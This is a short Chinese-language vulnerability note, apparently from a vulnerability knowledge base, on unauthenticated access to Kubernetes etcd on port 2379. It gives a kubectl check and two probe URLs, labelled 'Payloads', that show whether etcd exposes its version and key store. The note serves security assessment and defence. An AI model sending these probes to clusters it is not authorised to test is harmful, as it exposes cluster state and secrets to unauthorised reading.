# K8s etcd未授权访问

## 漏洞描述
etcd 是云原生架构中重要的基础组件。etcd 在微服务和 Kubernates 集群中不仅可以作为服务注册于发现，还可以作为 key-value 存储的中间件，为 k8s 集群提供底层数据存储，保存了整个集群的状态。

在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379，并且对外开放。

```
kubectl get pods -A | grep etcd
```

在 etcd 的配置文件 /etc/kubernetes/manifests/etcd.yaml 中，--client-cert-auth 默认为 true，这意味着访问 etcd 服务需要携带 cert 进行认证。

如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。

etcdctl 下载地址：https://github.com/etcd-io/etcd

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
### 查看是否存在未授权访问

访问以下链接，查看是否存在未授权访问。

```
https://your-ip:2379/version
-------------
返回如下则存在未授权访问：
{etcdserver: "3.4.3", etcdcluster: "3.4.0"} 
```

## Payloads
```
https://your-ip:2379/version
-------------
返回如下则存在未授权访问：
{etcdserver: "3.4.3", etcdcluster: "3.4.0"}
```
```
https://your-ip:2379/v2/keys
-------------
返回如下则存在未授权访问：
{"action":"get","node":{"dir":true,"nodes":...}}
```
